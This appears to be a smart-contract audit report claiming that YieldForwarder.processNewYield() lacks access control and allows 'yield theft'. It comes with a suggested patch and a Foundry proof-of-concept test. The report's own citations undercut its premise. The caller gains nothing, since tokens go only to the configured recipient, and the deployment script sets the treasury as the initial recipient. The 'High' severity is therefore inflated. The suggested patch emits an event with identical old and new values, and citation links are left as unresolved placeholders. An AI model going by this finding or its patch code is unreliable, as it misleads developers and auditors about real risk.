## Title
Missing Access Control in YieldForwarder.processNewYield() Allows Yield Theft During Deployment Window

## Summary
The `processNewYield()` function in YieldForwarder.sol lacks access control, allowing any address to trigger yield distribution to the current recipient. During multi-step deployments or recipient changes, an attacker can front-run `setYieldRecipient()` calls to redirect yield to unintended recipients, resulting in permanent loss of protocol yield.

## Impact
**Severity**: High

## Finding Description
**Location:** `src/protocol/YieldForwarder.sol`, function `processNewYield()`, line 97

**Intended Logic:** According to the IYieldProcessor interface documentation, `processNewYield()` is designed to be "called by the iTryIssuer contract after minting yield tokens" [1](#0-0) , implying it should have access control to ensure only authorized callers (iTryIssuer) can trigger yield distribution.

**Actual Logic:** The implementation has no access control whatsoever [2](#0-1) , allowing any address to call `processNewYield()` and force the transfer of all available yieldToken balance to the current `yieldRecipient`.

**Exploitation Path:**

1. **Deployment Setup:** YieldForwarder is deployed with an initial recipient address (e.g., deployer's address as placeholder during testing) [3](#0-2) 

2. **Yield Accumulation:** iTRY tokens accumulate in the YieldForwarder contract (either through iTryIssuer's `processAccumulatedYield()` function [4](#0-3)  or through accidental transfers during setup)

3. **Attack Execution:** Before the owner can call `setYieldRecipient()` to update to the correct recipient [5](#0-4) , attacker monitors the contract and calls `processNewYield()` with the current balance

4. **Yield Theft:** All accumulated iTRY tokens are transferred to the placeholder recipient address instead of the intended final recipient (e.g., treasury or StakediTry vault), resulting in permanent loss of protocol yield

**Security Property Broken:** This violates the implicit trust assumption that yield distribution should only be triggered by authorized protocol contracts (iTryIssuer) through the IYieldProcessor interface, not by arbitrary external actors.

## Impact Explanation
- **Affected Assets**: All iTRY tokens that accumulate in YieldForwarder contract during deployment/configuration windows
- **Damage Severity**: Complete loss of accumulated yield to wrong recipient. The amount depends on when the attack occurs - could be initial test yields or significant accumulated protocol yields worth thousands of dollars
- **User Impact**: Protocol treasury/stakers lose yield intended for them. If YieldForwarder was supposed to forward yield to StakediTry vault for distribution to stakers, all stakers collectively suffer the loss

## Likelihood Explanation
- **Attacker Profile**: Any unprivileged address with basic contract interaction capabilities
- **Preconditions**: 
  - YieldForwarder deployed with initial/temporary recipient
  - iTRY tokens present in YieldForwarder contract
  - Owner has not yet called `setYieldRecipient()` to update to final recipient
- **Execution Complexity**: Single transaction calling `processNewYield()` with appropriate amount parameter. Attacker can easily monitor YieldForwarder balance and front-run any pending `setYieldRecipient()` transactions
- **Frequency**: Exploitable any time during deployment windows, upgrades, or recipient changes where there's a gap between yield accumulation and recipient configuration

## Recommendation

Add access control to restrict `processNewYield()` to only authorized callers (iTryIssuer contract):

```solidity
// In src/protocol/YieldForwarder.sol, add state variable after line 38:

/// @notice The address authorized to trigger yield processing (typically iTryIssuer)
address public authorizedCaller;

// Update constructor to accept and set authorizedCaller (after line 74):

authorizedCaller = _authorizedCaller; // Pass iTryIssuer address
require(_authorizedCaller != address(0), "Invalid authorized caller");

// Add function to update authorizedCaller (owner-only, after line 131):

function setAuthorizedCaller(address _newCaller) external onlyOwner {
    require(_newCaller != address(0), "Invalid caller");
    authorizedCaller = _newCaller;
    emit AuthorizedCallerUpdated(authorizedCaller, _newCaller);
}

// Modify processNewYield() to include access control (line 97):

function processNewYield(uint256 _newYieldAmount) external override {
    require(msg.sender == authorizedCaller, "Unauthorized caller"); // ADD THIS CHECK
    if (_newYieldAmount == 0) revert CommonErrors.ZeroAmount();
    if (yieldRecipient == address(0)) revert RecipientNotSet();
    
    // Transfer yield tokens to the recipient
    if (!yieldToken.transfer(yieldRecipient, _newYieldAmount)) {
        revert CommonErrors.TransferFailed();
    }
    
    emit YieldForwarded(yieldRecipient, _newYieldAmount);
}
```

**Alternative mitigation:** If multiple callers need to trigger yield processing, implement role-based access control using OpenZeppelin's AccessControl and create a `YIELD_PROCESSOR_ROLE` that can be granted to authorized contracts.

## Proof of Concept

```solidity
// File: test/Exploit_YieldTheftDeploymentWindow.t.sol
// Run with: forge test --match-test test_YieldTheftDuringDeployment -vvv

pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/protocol/YieldForwarder.sol";
import "../src/protocol/iTryIssuer.sol";
import "../src/token/iTRY/iTry.sol";
import {MockERC20} from "./mocks/MockERC20.sol";

contract Exploit_YieldTheftDeploymentWindow is Test {
    YieldForwarder public yieldForwarder;
    MockERC20 public itryToken;
    
    address public owner;
    address public placeholderRecipient; // Temporary address during deployment
    address public intendedRecipient;   // Final treasury address
    address public attacker;
    
    function setUp() public {
        owner = makeAddr("owner");
        placeholderRecipient = makeAddr("placeholder");
        intendedRecipient = makeAddr("treasury");
        attacker = makeAddr("attacker");
        
        // Deploy iTRY token mock
        itryToken = new MockERC20("iTRY", "iTRY");
        
        // Simulate deployment with placeholder recipient
        vm.prank(owner);
        yieldForwarder = new YieldForwarder(address(itryToken), placeholderRecipient);
    }
    
    function test_YieldTheftDuringDeployment() public {
        // SETUP: Simulate yield accumulation before recipient is updated
        uint256 yieldAmount = 10000e18; // 10,000 iTRY yield accumulated
        itryToken.mint(address(yieldForwarder), yieldAmount);
        
        uint256 placeholderBalanceBefore = itryToken.balanceOf(placeholderRecipient);
        uint256 intendedBalanceBefore = itryToken.balanceOf(intendedRecipient);
        
        // EXPLOIT: Attacker front-runs setYieldRecipient() call
        vm.prank(attacker);
        yieldForwarder.processNewYield(yieldAmount);
        
        // VERIFY: Yield went to placeholder instead of intended recipient
        assertEq(
            itryToken.balanceOf(placeholderRecipient), 
            placeholderBalanceBefore + yieldAmount,
            "Vulnerability confirmed: Yield stolen to placeholder recipient"
        );
        assertEq(
            itryToken.balanceOf(intendedRecipient),
            intendedBalanceBefore,
            "Intended recipient received nothing"
        );
        
        // Now even if owner updates recipient, the yield is already gone
        vm.prank(owner);
        yieldForwarder.setYieldRecipient(intendedRecipient);
        
        // Intended recipient never receives the stolen yield
        assertEq(
            itryToken.balanceOf(intendedRecipient),
            0,
            "Permanent loss: Intended recipient never received yield"
        );
    }
    
    function test_AnyoneCanCallProcessNewYield() public {
        // SETUP: Any amount of yield in contract
        uint256 yieldAmount = 1000e18;
        itryToken.mint(address(yieldForwarder), yieldAmount);
        
        // EXPLOIT: Demonstrate any address can call processNewYield
        address randomUser = makeAddr("random");
        vm.prank(randomUser);
        yieldForwarder.processNewYield(yieldAmount);
        
        // VERIFY: Call succeeded without revert
        assertEq(
            itryToken.balanceOf(placeholderRecipient),
            yieldAmount,
            "Anyone can trigger yield distribution"
        );
    }
}
```

## Notes

This vulnerability is particularly critical because:

1. **No access control validation** - The function signature in YieldForwarder.sol explicitly shows no role or caller checks [6](#0-5) 

2. **Mismatch with interface intent** - While IYieldProcessor documentation implies authorized-only calling [7](#0-6) , the implementation doesn't enforce this

3. **Deployment script confirms multi-step setup** - The deployment shows YieldForwarder is created with an initial recipient that may need updating [8](#0-7) 

4. **Real attack window exists** - Between iTryIssuer minting yield to YieldForwarder and any potential recipient changes, tokens can be forcibly distributed by anyone

The fix requires adding explicit access control to ensure only the iTryIssuer contract (or other authorized addresses) can trigger yield distribution.

### Citations

**File:** src/protocol/periphery/IYieldProcessor.sol (L32-38)
```text
    /**
     * @notice Processes newly generated yield tokens
     * @dev This function is called by the iTryIssuer contract after minting yield tokens.
     *      The implementing contract should already have received the yield tokens before
     *      this function is called. Implementations must handle the yield appropriately
     *      according to their specific distribution logic.
     *
```

**File:** src/protocol/YieldForwarder.sol (L97-107)
```text
    function processNewYield(uint256 _newYieldAmount) external override {
        if (_newYieldAmount == 0) revert CommonErrors.ZeroAmount();
        if (yieldRecipient == address(0)) revert RecipientNotSet();

        // Transfer yield tokens to the recipient
        if (!yieldToken.transfer(yieldRecipient, _newYieldAmount)) {
            revert CommonErrors.TransferFailed();
        }

        emit YieldForwarded(yieldRecipient, _newYieldAmount);
    }
```

**File:** src/protocol/YieldForwarder.sol (L124-131)
```text
    function setYieldRecipient(address _newRecipient) external onlyOwner {
        if (_newRecipient == address(0)) revert CommonErrors.ZeroAddress();

        address oldRecipient = yieldRecipient;
        yieldRecipient = _newRecipient;

        emit YieldRecipientUpdated(oldRecipient, _newRecipient);
    }
```

**File:** script/deploy/hub/02_DeployProtocol.s.sol (L102-103)
```text
        YieldForwarder yieldForwarder = _deployYieldForwarder(factory, addrs.itryToken);
        require(address(yieldForwarder) == predictedYieldForwarder, "YieldForwarder address mismatch");
```

**File:** script/deploy/hub/02_DeployProtocol.s.sol (L188-195)
```text
    function _getYieldForwarderBytecode(address itryToken) internal view returns (bytes memory) {
        return abi.encodePacked(
            type(YieldForwarder).creationCode,
            abi.encode(
                itryToken, // yieldToken
                treasuryAddress // initialRecipient
            )
        );
```

**File:** src/protocol/iTryIssuer.sol (L412-416)
```text
        // Mint yield amount to yieldReceiver contract
        _mint(address(yieldReceiver), newYield);

        // Notify yield distributor of received yield
        yieldReceiver.processNewYield(newYield);
```
